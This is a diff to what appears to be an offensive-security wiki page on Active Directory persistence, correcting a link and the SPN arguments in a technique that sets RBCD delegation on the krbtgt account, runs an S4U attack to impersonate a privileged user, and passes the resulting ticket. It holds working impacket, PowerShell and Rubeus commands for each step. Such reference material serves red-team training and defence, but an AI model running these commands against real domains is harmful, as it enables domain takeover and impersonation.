@@ -17,7 +17,7 @@ An example of the abuse goes as follows :
 
 1. Configure RBCD delegation on the `krbtgt` account to allow a controlled account to delegate to it. The controlled account should have at least one SPN (i.e. ServicePrincipalName) for the delegation to work (or, see [SPN-less RBCD](../../movement/kerberos/delegations/rbcd.md#rbcd-on-spn-less-users)). This controlled account will be called "ControlledAccountWithSPN".
 2. Perform a full [S4U](../../movement/kerberos/delegations/) attack to obtain a Service Ticket for the `krbtgt` service, on behalf of another privileged user. Let's call this chosen user "TargetedAccount". The ticket obtained through this process is for the `KRBTGT` service, which basically means the ticket can be used as a TGT for the TargetedAccount.
-3. [Pass-the-ticket](../../movement/kerberos/ptt.md) to use the Service-Ticket-that-is-in-fact-a-TGT, act as the target -privileged- user, and authenticate to remote resources.
+3. [Pass-the-ticket](../../movement/kerberos/pass-the/ptt.md) to use the Service-Ticket-that-is-in-fact-a-TGT, act as the target -privileged- user, and authenticate to remote resources.
 
 ## Practice
 
@@ -33,7 +33,7 @@ Every step of this attack can be achieved using one of the following scripts fro
 rbcd.py -delegate-from 'ControlledAccountWithSPN' -delegate-to 'krbtgt' -dc-ip $dcIp -action write 'DOMAIN'/'PrivilegiedAccount':'StrongPassword'
 
 # Step 2 : S4U attack for TargetedAccount to ControlledAccountWithSPN
-getST.py -spn "KRBTGT" -impersonate "TargetedAccount" -dc-ip $dcIp 'DOMAIN'/'ControlledAccountWithSPN':'PasswordOfControlledAccountWithSPN'
+getST.py -spn "krbtgt/$DOMAIN" -impersonate "TargetedAccount" -dc-ip $dcIp 'DOMAIN'/'ControlledAccountWithSPN':'PasswordOfControlledAccountWithSPN'
 
 # Step 3 : Get Service Ticket for TargetedAccount to the target service using the previously obtained ticket (which is a TGT).
 KRB5CCNAME='TargetedAccount@krbtgt_DOMAIN@DOMAIN.ccache' getST.py -spn 'cifs/target' -k -no-pass 'DOMAIN'/'TargetedAccount'
@@ -51,7 +51,7 @@ Every step of this attack can be achieved using Rubeus and the Set-ADUser comman
 Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount ControlledAccountWithSPN
 
 # Step 2 : Full S4U for TargetedAccount to krbtgt using ControlledAccountWithSPN
-Rubeus.exe s4u /nowrap /impersonateuser:"TargetedAccount" /msdsspn:"krbtgt" /domain:"DOMAIN" /user:"ControlledAccountWithSPN" /rc4:$NThash
+Rubeus.exe s4u /nowrap /impersonateuser:"TargetedAccount" /msdsspn:"krbtgt/$DOMAIN" /domain:"DOMAIN" /user:"ControlledAccountWithSPN" /rc4:$NThash
 
 # Step 3 : Get Service Ticket for TargetedAccount to the target service using the previously obtained ticket (printed in a base64 blob thanks to the /nowrap flag), and inject it in memory using /ptt in order to use the resulting ticket for authentication to remote resources
 Rubeus.exe asktgs /service:"cifs/target" /ticket:"base64ticket...." /ptt
